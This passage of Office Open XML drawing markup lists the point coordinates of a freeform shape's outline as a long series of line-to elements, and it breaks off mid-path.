                    <a:pt x="7" y="58"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5" y="66"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="70"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="79"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5" y="83"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="88"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="92"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9" y="96"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14" y="104"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="112"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="114"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="133"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="137"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="141"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29" y="158"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33" y="165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36" y="169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34" y="175"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="187"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="195"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="213"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="218"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="222"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14" y="231"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="240"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="247"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="251"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26" y="254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33" y="260"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30" y="264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28" y="269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26" y="274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="278"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26" y="304"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28" y="309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="312"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="315"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="322"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="333"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9" y="336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7" y="340"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3" y="352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="357"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="361"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="369"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="378"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="387"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="396"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7" y="416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9" y="420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="424"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28" y="447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="451"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="467"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14" y="471"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="481"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="486"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="490"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14" y="499"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="508"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="516"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="524"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="533"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="537"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="552"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16" y="557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="562"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="571"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="590"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26" y="598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28" y="603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26" y="609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="615"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26" y="634"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30" y="645"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26" y="648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="662"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="666"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="670"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9" y="675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7" y="689"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9" y="702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="707"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14" y="715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="718"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16" y="736"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14" y="740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="744"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="753"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="757"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7" y="766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="784"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7" y="793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="802"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="811"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14" y="819"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16" y="823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="827"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="845"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="855"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="866"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="883"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16" y="894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="909"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16" y="913"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16" y="917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="921"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="928"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="938"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29" y="941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="32" y="944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="35" y="946"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="45" y="953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="956"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="68" y="958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72" y="958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76" y="958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="79" y="957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="84" y="958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="88" y="960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93" y="961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="97" y="962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="102" y="963"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="964"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112" y="964"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="116" y="964"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="121" y="964"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="126" y="964"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="131" y="963"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="135" y="962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="140" y="961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="144" y="960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="149" y="959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="153" y="957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="157" y="955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="161" y="953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="165" y="951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169" y="949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="172" y="947"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="176" y="944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="180" y="947"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="188" y="951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="192" y="953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="196" y="955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="201" y="956"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="206" y="956"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="210" y="957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="215" y="956"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="220" y="956"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="225" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="230" y="953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="234" y="951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="238" y="949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="242" y="946"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="246" y="943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="249" y="946"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="253" y="948"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="260" y="953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="264" y="955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="269" y="957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="273" y="959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="277" y="960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="281" y="962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="286" y="963"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="290" y="964"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="295" y="965"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="299" y="965"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="304" y="965"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="309" y="966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="313" y="965"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="318" y="965"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="323" y="965"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="327" y="964"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="332" y="963"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="336" y="962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="340" y="960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="344" y="959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="349" y="957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="352" y="955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="356" y="953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="360" y="951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="364" y="949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="946"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="371" y="944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="376" y="945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="382" y="946"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="387" y="947"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="393" y="947"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="398" y="947"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="403" y="947"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="407" y="947"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="412" y="946"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="417" y="946"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="421" y="945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="425" y="944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="430" y="942"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434" y="941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="438" y="939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="442" y="937"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="446" y="935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="450" y="933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="455" y="934"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="460" y="935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="466" y="935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="468" y="939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="471" y="942"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="474" y="945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="948"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="481" y="951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="485" y="953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="488" y="955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="493" y="956"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="497" y="958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="501" y="959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="506" y="959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="510" y="959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="515" y="959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="518" y="959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="522" y="958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="526" y="957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="530" y="956"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="534" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="537" y="952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="540" y="950"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="543" y="948"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="546" y="945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="549" y="943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="552" y="940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="554" y="937"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="556" y="933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="558" y="930"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="560" y="926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="561" y="923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="562" y="919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="563" y="915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="563" y="911"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="563" y="907"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="563" y="900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="562" y="894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="560" y="889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="558" y="883"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="560" y="879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="562" y="875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="564" y="870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="565" y="866"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="566" y="861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568" y="856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568" y="852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="847"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="837"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="832"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="827"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568" y="823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568" y="818"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="567" y="814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="566" y="809"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="564" y="805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="563" y="801"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="561" y="797"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="559" y="793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="557" y="789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="554" y="785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="555" y="780"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="556" y="774"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="556" y="769"/>
                  </a:lnTo>
                  <a:lnTo>
